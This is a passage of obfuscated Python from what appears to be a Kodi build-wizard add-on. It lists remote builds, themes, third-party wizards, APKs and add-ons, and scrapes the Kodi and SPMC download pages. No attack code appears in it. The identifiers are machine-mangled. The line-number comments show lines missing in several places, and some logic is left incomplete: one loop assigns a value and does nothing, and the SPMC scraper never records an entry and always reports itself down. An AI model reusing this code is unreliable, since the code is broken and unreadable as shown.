		addFile ('%s'%O0O00OO00000OO00O ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2221
	else :#line:2222
		OO00O0O00O0OO0OOO ,O000O0000000OO000 ,OOOO0O000O0OO0O0O ,OOOO00OOO0OO00OO0 ,O00OO0OO0OO0OO0O0 ,O0OO00OOOO00O0000 ,O0O0O0OOOOO00O000 =wiz .buildCount ()#line:2223
		OO0O00O0000OOOO00 =False ;O000O000O00OO0O00 =[]#line:2224
		if THIRDPARTY =='true':#line:2225
			if not THIRD1NAME ==''and not THIRD1URL =='':OO0O00O0000OOOO00 =True ;O000O000O00OO0O00 .append ('1')#line:2226
			if not THIRD2NAME ==''and not THIRD2URL =='':OO0O00O0000OOOO00 =True ;O000O000O00OO0O00 .append ('2')#line:2227
			if not THIRD3NAME ==''and not THIRD3URL =='':OO0O00O0000OOOO00 =True ;O000O000O00OO0O00 .append ('3')#line:2228
		O0O0OOOOOOOO00O00 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2229
		OO0O0OO000OO0O0O0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O0OOOOOOOO00O00 )#line:2230
		if OO00O0O00O0OO0OOO ==1 and OO0O00O0000OOOO00 ==False :#line:2231
			for OOOO00OO0OO00O00O ,O0OO0OOOOOOO0000O ,OO0000O0OO00000O0 ,O00O0O0O00O0OO000 ,OO0O0OOOO0OOO0O00 ,O0O000O0000OOOO0O ,O00000OOO0O0OO00O ,OOOO0OO0O0000O000 ,O0OOO0000OOOO0O0O ,O00O000OOOO000OO0 in OO0O0OO000OO0O0O0 :#line:2232
				if not SHOWADULT =='true'and O0OOO0000OOOO0O0O .lower ()=='yes':continue #line:2233
				if not DEVELOPER =='true'and wiz .strTest (OOOO00OO0OO00O00O ):continue #line:2234
				viewBuild (OO0O0OO000OO0O0O0 [0 ][0 ])#line:2235
				return #line:2236
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2239
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2240
		if OO0O00O0000OOOO00 ==True :#line:2241
			for O0OO00O0O00OOO000 in O000O000O00OO0O00 :#line:2242
				OOOO00OO0OO00O00O =eval ('THIRD%sNAME'%O0OO00O0O00OOO000 )#line:2243
		if len (OO0O0OO000OO0O0O0 )>=1 :#line:2245
			if SEPERATE =='true':#line:2246
				for OOOO00OO0OO00O00O ,O0OO0OOOOOOO0000O ,OO0000O0OO00000O0 ,O00O0O0O00O0OO000 ,OO0O0OOOO0OOO0O00 ,O0O000O0000OOOO0O ,O00000OOO0O0OO00O ,OOOO0OO0O0000O000 ,O0OOO0000OOOO0O0O ,O00O000OOOO000OO0 in OO0O0OO000OO0O0O0 :#line:2247
					if not SHOWADULT =='true'and O0OOO0000OOOO0O0O .lower ()=='yes':continue #line:2248
					if not DEVELOPER =='true'and wiz .strTest (OOOO00OO0OO00O00O ):continue #line:2249
					O00OOO0OO0OO0000O =createMenu ('install','',OOOO00OO0OO00O00O )#line:2250
					addDir ('[%s] %s (v%s)'%(float (OO0O0OOOO0OOO0O00 ),OOOO00OO0OO00O00O ,O0OO0OOOOOOO0000O ),'viewbuild',OOOO00OO0OO00O00O ,description =O00O000OOOO000OO0 ,fanart =OOOO0OO0O0000O000 ,icon =O00000OOO0O0OO00O ,menu =O00OOO0OO0OO0000O ,themeit =THEME2 )#line:2251
			else :#line:2252
				if OOOO00OOO0OO00OO0 >0 :#line:2253
					OOOOO00O0OO00OOOO ='+'if SHOW17 =='false'else '-'#line:2254
					if SHOW17 =='true':#line:2256
						for OOOO00OO0OO00O00O ,O0OO0OOOOOOO0000O ,OO0000O0OO00000O0 ,O00O0O0O00O0OO000 ,OO0O0OOOO0OOO0O00 ,O0O000O0000OOOO0O ,O00000OOO0O0OO00O ,OOOO0OO0O0000O000 ,O0OOO0000OOOO0O0O ,O00O000OOOO000OO0 in OO0O0OO000OO0O0O0 :#line:2258
							if not SHOWADULT =='true'and O0OOO0000OOOO0O0O .lower ()=='yes':continue #line:2259
							if not DEVELOPER =='true'and wiz .strTest (OOOO00OO0OO00O00O ):continue #line:2260
							OO0O000OO0000OO00 =int (float (OO0O0OOOO0OOO0O00 ))#line:2261
							if OO0O000OO0000OO00 ==17 :#line:2262
								O00OOO0OO0OO0000O =createMenu ('install','',OOOO00OO0OO00O00O )#line:2263
								addDir ('[%s] %s (v%s)'%(float (OO0O0OOOO0OOO0O00 ),OOOO00OO0OO00O00O ,O0OO0OOOOOOO0000O ),'viewbuild',OOOO00OO0OO00O00O ,description =O00O000OOOO000OO0 ,fanart =OOOO0OO0O0000O000 ,icon =O00000OOO0O0OO00O ,menu =O00OOO0OO0OO0000O ,themeit =THEME2 )#line:2264
				if O00OO0OO0OO0OO0O0 >0 :#line:2265
					OOOOO00O0OO00OOOO ='+'if SHOW18 =='false'else '-'#line:2266
					if SHOW18 =='true':#line:2268
						for OOOO00OO0OO00O00O ,O0OO0OOOOOOO0000O ,OO0000O0OO00000O0 ,O00O0O0O00O0OO000 ,OO0O0OOOO0OOO0O00 ,O0O000O0000OOOO0O ,O00000OOO0O0OO00O ,OOOO0OO0O0000O000 ,O0OOO0000OOOO0O0O ,O00O000OOOO000OO0 in OO0O0OO000OO0O0O0 :#line:2270
							if not SHOWADULT =='true'and O0OOO0000OOOO0O0O .lower ()=='yes':continue #line:2271
							if not DEVELOPER =='true'and wiz .strTest (OOOO00OO0OO00O00O ):continue #line:2272
							OO0O000OO0000OO00 =int (float (OO0O0OOOO0OOO0O00 ))#line:2273
							if OO0O000OO0000OO00 ==18 :#line:2274
								O00OOO0OO0OO0000O =createMenu ('install','',OOOO00OO0OO00O00O )#line:2275
								addDir ('[%s] %s (v%s)'%(float (OO0O0OOOO0OOO0O00 ),OOOO00OO0OO00O00O ,O0OO0OOOOOOO0000O ),'viewbuild',OOOO00OO0OO00O00O ,description =O00O000OOOO000OO0 ,fanart =OOOO0OO0O0000O000 ,icon =O00000OOO0O0OO00O ,menu =O00OOO0OO0OO0000O ,themeit =THEME2 )#line:2276
				if OOOO0O000O0OO0O0O >0 :#line:2277
					OOOOO00O0OO00OOOO ='+'if SHOW16 =='false'else '-'#line:2278
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOOOO00O0OO00OOOO ,OOOO0O000O0OO0O0O ),'togglesetting','show16',themeit =THEME3 )#line:2279
					if SHOW16 =='true':#line:2280
						for OOOO00OO0OO00O00O ,O0OO0OOOOOOO0000O ,OO0000O0OO00000O0 ,O00O0O0O00O0OO000 ,OO0O0OOOO0OOO0O00 ,O0O000O0000OOOO0O ,O00000OOO0O0OO00O ,OOOO0OO0O0000O000 ,O0OOO0000OOOO0O0O ,O00O000OOOO000OO0 in OO0O0OO000OO0O0O0 :#line:2281
							if not SHOWADULT =='true'and O0OOO0000OOOO0O0O .lower ()=='yes':continue #line:2282
							if not DEVELOPER =='true'and wiz .strTest (OOOO00OO0OO00O00O ):continue #line:2283
							OO0O000OO0000OO00 =int (float (OO0O0OOOO0OOO0O00 ))#line:2284
							if OO0O000OO0000OO00 ==16 :#line:2285
								O00OOO0OO0OO0000O =createMenu ('install','',OOOO00OO0OO00O00O )#line:2286
								addDir ('[%s] %s (v%s)'%(float (OO0O0OOOO0OOO0O00 ),OOOO00OO0OO00O00O ,O0OO0OOOOOOO0000O ),'viewbuild',OOOO00OO0OO00O00O ,description =O00O000OOOO000OO0 ,fanart =OOOO0OO0O0000O000 ,icon =O00000OOO0O0OO00O ,menu =O00OOO0OO0OO0000O ,themeit =THEME2 )#line:2287
				if O000O0000000OO000 >0 :#line:2288
					OOOOO00O0OO00OOOO ='+'if SHOW15 =='false'else '-'#line:2289
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOOOO00O0OO00OOOO ,O000O0000000OO000 ),'togglesetting','show15',themeit =THEME3 )#line:2290
					if SHOW15 =='true':#line:2291
						for OOOO00OO0OO00O00O ,O0OO0OOOOOOO0000O ,OO0000O0OO00000O0 ,O00O0O0O00O0OO000 ,OO0O0OOOO0OOO0O00 ,O0O000O0000OOOO0O ,O00000OOO0O0OO00O ,OOOO0OO0O0000O000 ,O0OOO0000OOOO0O0O ,O00O000OOOO000OO0 in OO0O0OO000OO0O0O0 :#line:2292
							if not SHOWADULT =='true'and O0OOO0000OOOO0O0O .lower ()=='yes':continue #line:2293
							if not DEVELOPER =='true'and wiz .strTest (OOOO00OO0OO00O00O ):continue #line:2294
							OO0O000OO0000OO00 =int (float (OO0O0OOOO0OOO0O00 ))#line:2295
							if OO0O000OO0000OO00 <=15 :#line:2296
								O00OOO0OO0OO0000O =createMenu ('install','',OOOO00OO0OO00O00O )#line:2297
								addDir ('[%s] %s (v%s)'%(float (OO0O0OOOO0OOO0O00 ),OOOO00OO0OO00O00O ,O0OO0OOOOOOO0000O ),'viewbuild',OOOO00OO0OO00O00O ,description =O00O000OOOO000OO0 ,fanart =OOOO0OO0O0000O000 ,icon =O00000OOO0O0OO00O ,menu =O00OOO0OO0OO0000O ,themeit =THEME2 )#line:2298
		elif O0O0O0OOOOO00O000 >0 :#line:2299
			if O0OO00OOOO00O0000 >0 :#line:2300
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2301
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2302
			else :#line:2303
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2304
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2305
	setView ('files','viewType')#line:2306
def viewBuild (O0OO00OOOO0OOO00O ):#line:2308
	O00O0OOO00OO0O0OO =wiz .workingURL (SPEEDFILE )#line:2309
	if not O00O0OOO00OO0O0OO ==True :#line:2310
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2311
		addFile ('%s'%O00O0OOO00OO0O0OO ,'',themeit =THEME3 )#line:2312
		return #line:2313
	if wiz .checkBuild (O0OO00OOOO0OOO00O ,'version')==False :#line:2314
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2315
		addFile ('%s was not found in the builds list.'%O0OO00OOOO0OOO00O ,'',themeit =THEME3 )#line:2316
		return #line:2317
	O000OOOOOO000O0O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2318
	OOOO0O00OO0O000O0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0OO00OOOO0OOO00O ).findall (O000OOOOOO000O0O0 )#line:2319
	for O00OO0OOOO000OO0O ,OOO00O0O00O00O000 ,O0O0000O000OO0OO0 ,O0O0OO0OO0O00OOO0 ,O0OOO00000OO0O000 ,O0OOO000O0OOOOO00 ,O0000OO00OO00OO00 ,OOOO0OO00OO00OO0O ,OOO0OO0OO0000O0OO ,OO0OOOO0OOOOOO000 in OOOO0O00OO0O000O0 :#line:2320
		O0OOO000O0OOOOO00 =O0OOO000O0OOOOO00 if wiz .workingURL (O0OOO000O0OOOOO00 )else ICON #line:2321
		O0000OO00OO00OO00 =O0000OO00OO00OO00 if wiz .workingURL (O0000OO00OO00OO00 )else FANART #line:2322
		O0OO00000O00O00OO ='%s (v%s)'%(O0OO00OOOO0OOO00O ,O00OO0OOOO000OO0O )#line:2323
		if BUILDNAME ==O0OO00OOOO0OOO00O and O00OO0OOOO000OO0O >BUILDVERSION :#line:2324
			O0OO00000O00O00OO ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O0OO00000O00O00OO ,BUILDVERSION )#line:2325
		O0O00000OO000OOOO =int (float (KODIV ));O0000O0O0OOO0OOOO =int (float (O0O0OO0OO0O00OOO0 ))#line:2334
		if not O0O00000OO000OOOO ==O0000O0O0OOO0OOOO :#line:2335
			if O0O00000OO000OOOO ==16 and O0000O0O0OOO0OOOO <=15 :O0OO00OOOOO00OO00 =False #line:2336
			else :O0OO00OOOOO00OO00 =True #line:2337
		else :O0OO00OOOOO00OO00 =False #line:2338
		addFile ('התקנה','install',O0OO00OOOO0OOO00O ,'fresh',description =OO0OOOO0OOOOOO000 ,fanart =O0000OO00OO00OO00 ,icon =O0OOO000O0OOOOO00 ,themeit =THEME1 )#line:2342
		if not O0OOO00000OO0O000 =='http://':#line:2345
			if wiz .workingURL (O0OOO00000OO0O000 )==True :#line:2346
				addFile (wiz .sep ('THEMES'),'',fanart =O0000OO00OO00OO00 ,icon =O0OOO000O0OOOOO00 ,themeit =THEME3 )#line:2347
				O000OOOOOO000O0O0 =wiz .openURL (O0OOO00000OO0O000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2348
				OOOO0O00OO0O000O0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O000OOOOOO000O0O0 )#line:2349
				for OOO000O00OO0OOOO0 ,OOO0O00000OOOO0OO ,O000000OO000OOO00 ,O0O0OOOO0O000OOO0 ,OO0O0OOOOO0OOO000 ,OO0OOOO0OOOOOO000 in OOOO0O00OO0O000O0 :#line:2350
					if not SHOWADULT =='true'and OO0O0OOOOO0OOO000 .lower ()=='yes':continue #line:2351
					O000000OO000OOO00 =O000000OO000OOO00 if O000000OO000OOO00 =='http://'else O0OOO000O0OOOOO00 #line:2352
					O0O0OOOO0O000OOO0 =O0O0OOOO0O000OOO0 if O0O0OOOO0O000OOO0 =='http://'else O0000OO00OO00OO00 #line:2353
					addFile (OOO000O00OO0OOOO0 if not OOO000O00OO0OOOO0 ==BUILDTHEME else "[B]%s (Installed)[/B]"%OOO000O00OO0OOOO0 ,'theme',O0OO00OOOO0OOO00O ,OOO000O00OO0OOOO0 ,description =OO0OOOO0OOOOOO000 ,fanart =O0O0OOOO0O000OOO0 ,icon =O000000OO000OOO00 ,themeit =THEME3 )#line:2354
	setView ('files','viewType')#line:2355
def viewThirdList (OO0O0000O0OOO0OO0 ):#line:2357
	OOOO0OOOO0O00O00O =eval ('THIRD%sNAME'%OO0O0000O0OOO0OO0 )#line:2358
	OOOO00O00OO0OO0O0 =eval ('THIRD%sURL'%OO0O0000O0OOO0OO0 )#line:2359
	O0O0O0OOO000O000O =wiz .workingURL (OOOO00O00OO0OO0O0 )#line:2360
	if not O0O0O0OOO000O000O ==True :#line:2361
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2362
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2363
	else :#line:2364
		O000O0000O000O000 ,OO00O0OO0OO0O0OO0 =wiz .thirdParty (OOOO00O00OO0OO0O0 )#line:2365
		addFile ("[B]%s[/B]"%OOOO0OOOO0O00O00O ,'',themeit =THEME3 )#line:2366
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2367
		if O000O0000O000O000 :#line:2368
			for OOOO0OOOO0O00O00O ,O00OOO0OO0OO0O000 ,OOOO00O00OO0OO0O0 ,O0O00OOO0OOO0O0O0 ,OO0O0O00O0O0OOO0O ,O0OOOOO0OOO0O0O0O ,O0O0OOOO0OO0000OO ,O0OO0O00OOO0O00OO in OO00O0OO0OO0O0OO0 :#line:2369
				if not SHOWADULT =='true'and O0O0OOOO0OO0000OO .lower ()=='yes':continue #line:2370
				addFile ("[%s] %s v%s"%(O0O00OOO0OOO0O0O0 ,OOOO0OOOO0O00O00O ,O00OOO0OO0OO0O000 ),'installthird',OOOO0OOOO0O00O00O ,OOOO00O00OO0OO0O0 ,icon =OO0O0O00O0O0OOO0O ,fanart =O0OOOOO0OOO0O0O0O ,description =O0OO0O00OOO0O00OO ,themeit =THEME2 )#line:2371
		else :#line:2372
			for OOOO0OOOO0O00O00O ,OOOO00O00OO0OO0O0 ,OO0O0O00O0O0OOO0O ,O0OOOOO0OOO0O0O0O ,O0OO0O00OOO0O00OO in OO00O0OO0OO0O0OO0 :#line:2373
				addFile (OOOO0OOOO0O00O00O ,'installthird',OOOO0OOOO0O00O00O ,OOOO00O00OO0OO0O0 ,icon =OO0O0O00O0O0OOO0O ,fanart =O0OOOOO0OOO0O0O0O ,description =O0OO0O00OOO0O00OO ,themeit =THEME2 )#line:2374
def editThirdParty (O0O0OO000O0OO00OO ):#line:2376
	OO00O0OO0O000OOOO =eval ('THIRD%sNAME'%O0O0OO000O0OO00OO )#line:2377
	OOO0OO00OOOO0O0O0 =eval ('THIRD%sURL'%O0O0OO000O0OO00OO )#line:2378
	OO0O000O00O0O0O00 =wiz .getKeyboard (OO00O0OO0O000OOOO ,'Enter the Name of the Wizard')#line:2379
	OO0OOO0O0OOOOOOOO =wiz .getKeyboard (OOO0OO00OOOO0O0O0 ,'Enter the URL of the Wizard Text')#line:2380
	wiz .setS ('wizard%sname'%O0O0OO000O0OO00OO ,OO0O000O00O0O0O00 )#line:2382
	wiz .setS ('wizard%surl'%O0O0OO000O0OO00OO ,OO0OOO0O0OOOOOOOO )#line:2383
def apkScraper (name =""):#line:2385
	if name =='kodi':#line:2386
		O0OOO000O000OOOO0 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2387
		OOO0O0O0OOOO0O0OO ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2388
		O0OOOOOOOOO00O0OO =wiz .openURL (O0OOO000O000OOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2389
		OO0OOOOOO00OOOO0O =wiz .openURL (OOO0O0O0OOOO0O0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2390
		OOO0OOOO0OOOO0OOO =0 #line:2391
		O00OO00OOOO00OOO0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0OOOOOOOOO00O0OO )#line:2392
		O00O0O0000O0OOOOO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0OOOOOO00OOOO0O )#line:2393
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2395
		O000000OO0000O000 =False #line:2396
		for O00OOO0O0OOO0000O ,name ,OOO0OO000O00O0OO0 ,O0O000OO000OOO0O0 in O00OO00OOOO00OOO0 :#line:2397
			if O00OOO0O0OOO0000O in ['../','old/']:continue #line:2398
			if not O00OOO0O0OOO0000O .endswith ('.apk'):continue #line:2399
			if not O00OOO0O0OOO0000O .find ('_')==-1 and O000000OO0000O000 ==True :continue #line:2400
			try :#line:2401
				OO000O00OOO0000OO =name .split ('-')#line:2402
				if not O00OOO0O0OOO0000O .find ('_')==-1 :#line:2403
					O000000OO0000O000 =True #line:2404
					OO0000OO00O0O0OO0 ,OO0OOOOOO0OOOO00O =OO000O00OOO0000OO [2 ].split ('_')#line:2405
				else :#line:2406
					OO0000OO00O0O0OO0 =OO000O00OOO0000OO [2 ]#line:2407
					OO0OOOOOO0OOOO00O =''#line:2408
				OO0OOO000OOO0OOO0 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000O00OOO0000OO [0 ].title (),OO000O00OOO0000OO [1 ],OO0OOOOOO0OOOO00O .upper (),OO0000OO00O0O0OO0 ,COLOR2 ,OOO0OO000O00O0OO0 .replace (' ',''),COLOR1 ,O0O000OO000OOO0O0 )#line:2409
				O0OO00OOOOO0000O0 =urljoin (O0OOO000O000OOOO0 ,O00OOO0O0OOO0000O )#line:2410
				addFile (OO0OOO000OOO0OOO0 ,'apkinstall',"%s v%s%s %s"%(OO000O00OOO0000OO [0 ].title (),OO000O00OOO0000OO [1 ],OO0OOOOOO0OOOO00O .upper (),OO0000OO00O0O0OO0 ),O0OO00OOOOO0000O0 )#line:2411
				OOO0OOOO0OOOO0OOO +=1 #line:2412
			except :#line:2413
				wiz .log ("Error on: %s"%name )#line:2414
		for O00OOO0O0OOO0000O ,name ,OOO0OO000O00O0OO0 ,O0O000OO000OOO0O0 in O00O0O0000O0OOOOO :#line:2416
			if O00OOO0O0OOO0000O in ['../','old/']:continue #line:2417
			if not O00OOO0O0OOO0000O .endswith ('.apk'):continue #line:2418
			if not O00OOO0O0OOO0000O .find ('_')==-1 :continue #line:2419
			try :#line:2420
				OO000O00OOO0000OO =name .split ('-')#line:2421
				OO0OOO000OOO0OOO0 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000O00OOO0000OO [0 ].title (),OO000O00OOO0000OO [1 ],OO000O00OOO0000OO [2 ],COLOR2 ,OOO0OO000O00O0OO0 .replace (' ',''),COLOR1 ,O0O000OO000OOO0O0 )#line:2422
				O0OO00OOOOO0000O0 =urljoin (OOO0O0O0OOOO0O0OO ,O00OOO0O0OOO0000O )#line:2423
				addFile (OO0OOO000OOO0OOO0 ,'apkinstall',"%s v%s %s"%(OO000O00OOO0000OO [0 ].title (),OO000O00OOO0000OO [1 ],OO000O00OOO0000OO [2 ]),O0OO00OOOOO0000O0 )#line:2424
				OOO0OOOO0OOOO0OOO +=1 #line:2425
			except :#line:2426
				wiz .log ("Error on: %s"%name )#line:2427
		if OOO0OOOO0OOOO0OOO ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2428
	elif name =='spmc':#line:2429
		OOO000O000O0OO0O0 ='https://github.com/koying/SPMC/releases'#line:2430
		O0OOOOOOOOO00O0OO =wiz .openURL (OOO000O000O0OO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2431
		OOO0OOOO0OOOO0OOO =0 #line:2432
		O00OO00OOOO00OOO0 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O0OOOOOOOOO00O0OO )#line:2433
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2435
		for name ,OOOOO000O0O0OO0OO in O00OO00OOOO00OOO0 :#line:2437
			OO000O0OO0OOO0OO0 =''#line:2438
			O00O0O0000O0OOOOO =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OOOOO000O0O0OO0OO )#line:2439
			for OOO0O00O0O0OOOOO0 ,OO0OO0OOOO000O00O ,O0OOOOO000O0O000O in O00O0O0000O0OOOOO :#line:2440
				if O0OOOOO000O0O000O .find ('armeabi')==-1 :continue #line:2441
				if O0OOOOO000O0O000O .find ('launcher')>-1 :continue #line:2442
				OO000O0OO0OOO0OO0 =urljoin ('https://github.com',OOO0O00O0O0OOOOO0 )#line:2443
				break #line:2444
		if OOO0OOOO0OOOO0OOO ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2446
def apkMenu (url =None ):#line:2448
	if url ==None :#line:2449
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2452
	if not APKFILE =='http://':#line:2453
		if url ==None :#line:2454
			O000000OOOO00OOO0 =wiz .workingURL (APKFILE )#line:2455
			O00O00000O0OO000O =uservar .APKFILE #line:2456
		else :#line:2457
			O000000OOOO00OOO0 =wiz .workingURL (url )#line:2458
			O00O00000O0OO000O =url #line:2459
		if O000000OOOO00OOO0 ==True :#line:2460
			OOOO00O0000OO0O0O =wiz .openURL (O00O00000O0OO000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2461
			O00O00000OO0O0000 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOO00O0000OO0O0O )#line:2462
			if len (O00O00000OO0O0000 )>0 :#line:2463
				OO000O0OOOO0OOOO0 =0 #line:2464
				for OOOO0OOO00OO0OOOO ,OO00O0000O0O00O0O ,url ,O0OO0OOOOO00O0000 ,OO0O00O0O0O000OO0 ,OO0OO0O0O0OOO00OO ,OO0000OOOO0O0000O in O00O00000OO0O0000 :#line:2465
					if not SHOWADULT =='true'and OO0OO0O0O0OOO00OO .lower ()=='yes':continue #line:2466
					if OO00O0000O0O00O0O .lower ()=='yes':#line:2467
						OO000O0OOOO0OOOO0 +=1 #line:2468
						addDir ("[B]%s[/B]"%OOOO0OOO00OO0OOOO ,'apk',url ,description =OO0000OOOO0O0000O ,icon =O0OO0OOOOO00O0000 ,fanart =OO0O00O0O0O000OO0 ,themeit =THEME3 )#line:2469
					else :#line:2470
						OO000O0OOOO0OOOO0 +=1 #line:2471
						addFile (OOOO0OOO00OO0OOOO ,'apkinstall',OOOO0OOO00OO0OOOO ,url ,description =OO0000OOOO0O0000O ,icon =O0OO0OOOOO00O0000 ,fanart =OO0O00O0O0O000OO0 ,themeit =THEME2 )#line:2472
					if OO000O0OOOO0OOOO0 <1 :#line:2473
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2474
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2475
		else :#line:2476
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2477
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2478
			addFile ('%s'%O000000OOOO00OOO0 ,'',themeit =THEME3 )#line:2479
		return #line:2480
	else :wiz .log ("[APK Menu] No APK list added.")#line:2481
	setView ('files','viewType')#line:2482
def addonMenu (url =None ):#line:2484
	if not ADDONFILE =='http://':#line:2485
		if url ==None :#line:2486
			OOOO0O0OO00O000OO =wiz .workingURL (ADDONFILE )#line:2487
			O0OOO0O0OOOOOO0OO =uservar .ADDONFILE #line:2488
		else :#line:2489
			OOOO0O0OO00O000OO =wiz .workingURL (url )#line:2490
			O0OOO0O0OOOOOO0OO =url #line:2491
		if OOOO0O0OO00O000OO ==True :#line:2492
			OO0OOOOO0O0OOO00O =wiz .openURL (O0OOO0O0OOOOOO0OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2493
			OO0O0O000O00O0O0O =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0OOOOO0O0OOO00O )#line:2494
			if len (OO0O0O000O00O0O0O )>0 :#line:2495
				O00000O0O0O0O000O =0 #line:2496
				for O0O00OOOOO0O0O0O0 ,OOO0OOOOO0OO0000O ,url ,OO00O00000OOO00O0 ,O00OOO0OO0OOO0OOO ,O0O00OO00O00OOO0O ,O00OOOO00OO0OO000 ,OOO0OO00O00OOOO0O ,O00OO00OOOO0O0O00 ,O0000OO0O0O0000O0 in OO0O0O000O00O0O0O :#line:2497
					if OOO0OOOOO0OO0000O .lower ()=='section':#line:2498
						O00000O0O0O0O000O +=1 #line:2499
						addDir ("[B]%s[/B]"%O0O00OOOOO0O0O0O0 ,'addons',url ,description =O0000OO0O0O0000O0 ,icon =O00OOOO00OO0OO000 ,fanart =OOO0OO00O00OOOO0O ,themeit =THEME3 )#line:2500
					else :#line:2501
						if not SHOWADULT =='true'and O00OO00OOOO0O0O00 .lower ()=='yes':continue #line:2502
						try :#line:2503
							OOOO00OO0OOO00000 =xbmcaddon .Addon (id =OOO0OOOOO0OO0000O ).getAddonInfo ('path')#line:2504
							if os .path .exists (OOOO00OO0OOO00000 ):#line:2505
								O0O00OOOOO0O0O0O0 ="[COLOR green][Installed][/COLOR] %s"%O0O00OOOOO0O0O0O0 #line:2506
						except :#line:2507
							pass #line:2508
						O00000O0O0O0O000O +=1 #line:2509
						addFile (O0O00OOOOO0O0O0O0 ,'addoninstall',OOO0OOOOO0OO0000O ,O0OOO0O0OOOOOO0OO ,description =O0000OO0O0O0000O0 ,icon =O00OOOO00OO0OO000 ,fanart =OOO0OO00O00OOOO0O ,themeit =THEME2 )#line:2510
					if O00000O0O0O0O000O <1 :#line:2511
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2512
			else :#line:2513
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2514
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2515
		else :#line:2516
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2517
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2518
			addFile ('%s'%OOOO0O0OO00O000OO ,'',themeit =THEME3 )#line:2519
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2520
	setView ('files','viewType')#line:2521
def addonInstaller (OOOOO00O000O00OOO ,O0O0OOO0O00O0OOO0 ):#line:2523
	if not ADDONFILE =='http://':#line:2524
		O00OO0OO0O00OOO0O =wiz .workingURL (O0O0OOO0O00O0OOO0 )#line:2525
		if O00OO0OO0O00OOO0O ==True :#line:2526
